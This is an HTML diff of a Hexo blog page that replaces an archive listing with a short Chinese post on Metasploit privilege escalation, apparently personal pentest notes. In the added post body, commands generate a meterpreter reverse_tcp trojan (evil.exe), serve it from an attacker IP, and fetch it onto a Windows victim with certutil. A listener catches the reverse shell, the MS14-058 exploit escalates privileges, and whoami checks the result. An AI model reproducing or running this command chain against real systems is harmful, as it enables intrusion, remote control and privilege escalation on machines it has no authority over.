@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>归档 - Hexo</title>
+    <title>msf提权 - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -404,77 +404,77 @@ header .header__right .dropdown-menus .dropdown-menu {
             
 
 <article class="page">
-  <div class="archive-list">
-    <p class="h4">共计 19 篇文章</p>
-    <hr>
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>msf提权</h3>
     
-    
-      
-        
-        <p class="h5">2022</p>
-      
-      <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">文件包含漏洞</span>
-        <time style="float: right;">04-20</time>
-      </a>
-    
-      
-      <a href="/2022/04/13/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">绕过waf技巧</span>
-        <time style="float: right;">04-13</time>
-      </a>
-    
-      
-      <a href="/2022/04/06/sql-lib/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">sql-lib</span>
-        <time style="float: right;">04-06</time>
-      </a>
-    
-      
-      <a href="/2022/03/29/sqlmap/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">sqlmap</span>
-        <time style="float: right;">03-29</time>
-      </a>
-    
-      
-      <a href="/2022/03/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">渗透测试插件</span>
-        <time style="float: right;">03-21</time>
-      </a>
-    
-      
-      <a href="/2022/03/15/mysql/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">mysql</span>
-        <time style="float: right;">03-15</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/PHP/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">PHP</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/Linux/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">Linux</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">第一篇博客</span>
-        <time style="float: right;">03-08</time>
-      </a>
-    
-
-    <nav aria-label="navigation">
-      <span class="pagination" id="pagination">
-        <a class="extend prev" rel="prev" href="/archives/">&lt;</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span>
+      <span class="post-meta-label">
+        John Doe
       </span>
-    </nav>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-06-06 11:57" pubdate>
+          2022-06-06
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 127 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <p>(5)msf</p>
+<p>msfvenom 生成木马/shellcode<br>msfconsole 进入到MSF的终端，做一些测试或者参数设置</p>
+<p>生成木马：<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.103 LPORT=1234 -f exe -o evil.exe</p>
+<p>开启web服务器<br>php -S 0.0.0.0:9090</p>
+<p>上传木马<br><a target="_blank" rel="noopener" href="http://192.168.10.103:9090/evil.exe">http://192.168.10.103:9090/evil.exe</a><br>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.10.103:9090/evil.exe">http://192.168.10.103:9090/evil.exe</a>  c:/windows/temp/eee.exe</p>
+<p>kali监听端口<br>handler -p windows/x64/meterpreter/reverse_tcp  -H 0.0.0.0 -P 1234</p>
+<p>上线木马<br>MS14-058-x64.exe c:/windows/temp/eee.exe </p>
+<p>验证权限<br>sessions -i 1 -c “whoami”</p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span></span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
 
 </div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
 </article>
+
+
         </div>
         
 <footer class="text-center">
@@ -491,6 +491,8 @@ header .header__right .dropdown-menus .dropdown-menu {
 </footer>
 
 <div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
     
     <a href="#top" class="click-btn">
       <i id="i-up"></i>
@@ -526,8 +528,50 @@ header .header__right .dropdown-menus .dropdown-menu {
 </script>
 
 
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
 
 
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
 
 
 
